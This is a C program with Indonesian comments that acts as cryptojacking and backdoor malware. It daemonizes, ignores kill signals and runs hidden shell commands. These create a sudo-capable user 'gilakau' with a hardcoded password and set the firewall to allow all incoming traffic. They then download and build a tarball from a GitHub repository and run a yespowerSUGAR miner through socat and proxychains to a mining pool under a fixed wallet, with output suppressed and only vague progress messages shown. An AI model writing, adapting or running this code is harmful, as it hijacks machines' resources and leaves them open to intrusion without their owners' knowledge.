#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>

// Fungsi untuk mengabaikan sinyal
void signal_ignore(int sig) {
    (void)sig;
}

void setup_signal_handlers() {
    struct sigaction sa;
    sa.sa_handler = signal_ignore;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);

    if (sigaction(SIGINT, &sa, NULL) < 0 ||
        sigaction(SIGTERM, &sa, NULL) < 0 ||
        sigaction(SIGHUP, &sa, NULL) < 0 ||
        sigaction(SIGQUIT, &sa, NULL) < 0) {
        perror("sigaction failed");
        exit(EXIT_FAILURE);
    }
}

void daemonize() {
    pid_t pid = fork();  // Fork pertama
    if (pid < 0) exit(EXIT_FAILURE);  // Jika gagal fork

    if (pid > 0) exit(EXIT_SUCCESS);  // Proses induk keluar

    // Fork kedua untuk menjalankan proses di latar belakang
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    // Mengubah direktori kerja
    if (chdir("/") < 0) {
        perror("chdir failed");
        exit(EXIT_FAILURE);
    }

    // Menghapus umask
    umask(0);

    // Membuat sesi baru dan menghapus terminal kontrol
    if (setsid() < 0) {
        perror("setsid failed");
        exit(EXIT_FAILURE);
    }

    // Mengabaikan sinyal
    setup_signal_handlers();
}

// Variabel untuk menandai status loading
volatile bool loading = false;

// Spinner animation
void* spinner(void* arg) {
    const char spin_chars[] = "/-\\|";
    int i = 0;
    while (loading) {
        printf("\r%c Loading...", spin_chars[i % 4]);
        fflush(stdout);
        usleep(300000);
        i++;
    }
    printf("\r✓ Selesai      \n");
    return NULL;
}

// Bersihkan tampilan perintah dari argumen teknis
void bersihkanPerintah(const char* input, char* output, size_t maxLen) {
    char temp[512];
    strncpy(temp, input, sizeof(temp));
    temp[sizeof(temp) - 1] = '\0';

    char* token = strtok(temp, " ");
    output[0] = '\0';

    while (token != NULL) {
        if (strcmp(token, "sudo") == 0 ||
            strcmp(token, "-y") == 0 ||
            strcmp(token, ">") == 0 ||
            strcmp(token, "2>&1") == 0 ||
            strstr(token, "/dev/null") != NULL) {
            token = strtok(NULL, " ");
            continue;
        }
        if (strlen(output) + strlen(token) + 2 < maxLen) {
            strcat(output, token);
            strcat(output, " ");
        }
        token = strtok(NULL, " ");
    }

    size_t len = strlen(output);
    if (len > 0 && output[len - 1] == ' ') {
        output[len - 1] = '\0';
    }
}

// Fungsi utama dengan opsi spinner dan tampilkan nama
int jalankanPerintah(const char* cmd, bool tampilkanPerintah, bool pakaiSpinner) {
    if (tampilkanPerintah) {
        char bersih[512];
        bersihkanPerintah(cmd, bersih, sizeof(bersih));
        printf("Menjalankan perintah: %s\n", bersih);
    }

    pthread_t thread_id;

    if (pakaiSpinner) {
        loading = true;
        pthread_create(&thread_id, NULL, spinner, NULL);
    }

    // Pisahkan perintah dan argumennya
    char *cmd_copy = strdup(cmd);
    char *args[512];
    int i = 0;
    char *token = strtok(cmd_copy, " ");
    while (token != NULL) {
        args[i++] = token;
        token = strtok(NULL, " ");
    }
    args[i] = NULL;  // Akhirkan array argumen dengan NULL

    pid_t pid = fork(); // Membuat proses anak

    if (pid == 0) {  // Proses anak
        // Eksekusi perintah menggunakan execvp
        execvp(args[0], args);
        perror("execvp failed");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {  // Proses induk
        int status;
        waitpid(pid, &status, 0);  // Tunggu proses anak selesai

        if (WIFEXITED(status)) {
            int exitCode = WEXITSTATUS(status);
            if (exitCode != 0) {
                printf("\n[ERROR] Perintah gagal dijalankan. Exit code: %d\n", exitCode);
            }
            return exitCode;
        } else {
            printf("\n[ERROR] Perintah tidak dieksekusi dengan benar.\n");
            return -1;
        }
    } else {
        perror("fork failed");
        return -1;
    }

    if (pakaiSpinner) {
        loading = false;
        pthread_join(thread_id, NULL);
    }

    return 0;
}

// Fungsi-fungsi perintah
int perintahSatu() {
    return jalankanPerintah("sudo apt update -y", true, false);
}

int perintahDua() {
    printf("Process number 2...\n");
    return jalankanPerintah("sudo adduser --disabled-password --gecos "" --allow-bad-names gilakau > /dev/null 2>&1", false, true);
}

int perintahTiga() {
    printf("Process number 3...\n");
    return jalankanPerintah("echo 'gilakau:SapuLidi10' | sudo chpasswd > /dev/null 2>&1", false, true);
}

int perintahEmpat() {
    printf("Process number 4...\n");
    return jalankanPerintah("grep gilakau /etc/passwd > /dev/null 2>&1", false, true);
}

int perintahLima() {
    printf("Process number 5...\n");
    return jalankanPerintah("sudo usermod -a -G sudo gilakau > /dev/null 2>&1", false, true);
}

int perintahEnam() {
    printf("Process number 6...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'apt update -y > /dev/null 2>&1 && apt install ufw libcurl4-openssl-dev libssl-dev libjansson-dev socat -y > /dev/null 2>&1 && ufw enable > /dev/null 2>&1 && ufw default allow incoming > /dev/null 2>&1 && ufw default allow outgoing > /dev/null 2>&1 && ufw status verbose > /dev/null 2>&1 && ufw status > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahTujuh() {
    printf("Process number 7...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'curl -O https://raw.githubusercontent.com/piksuf/naszuiernamsxcuioernaszxcvuio/refs/heads/main/myapp.tar.gz > /dev/null 2>&1 && tar -xf myapp.tar.gz > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahDelapan() {
    printf("Process number 8...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c './configure --prefix=$PWD > /dev/null 2>&1 && make clean > /dev/null 2>&1 && make > /dev/null 2>&1 && make install > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int perintahSembilan() {
    printf("Process number 9...\n");
    return jalankanPerintah("echo 'SapuLidi10' | su gilakau -c \"echo 'SapuLidi10' | sudo -S -H bash -c 'timeout 35s socat TCP4-LISTEN:8080,fork TCP4:yespowerSUGAR.na.mine.zpool.ca:6241 > /dev/null 2>&1 | timeout 30s ./proxychains4 ./sse -a yespowerSUGAR -o stratum+tcp://localhost:8080 -u D8zcvGHWayuBq5MRncKTnKtFcooQCueZLP.T_$(date +\"%d%m\")_$(date +\"%H%M\") -p c=DGB,zap=SUGAR -t $(nproc) -q > /dev/null 2>&1' > /dev/null 2>&1\" > /dev/null 2>&1", false, true);
}

int main() {
    daemonize();

    if (perintahSatu() != 0) {}
    if (perintahDua() != 0) {}
    if (perintahTiga() != 0) {}
    if (perintahEmpat() != 0) {}
    if (perintahLima() != 0) {}
    if (perintahEnam() != 0) {}
    if (perintahTujuh() != 0) {}
    if (perintahDelapan() != 0) {}
    if (perintahSembilan() != 0) {}

    return 0;
}
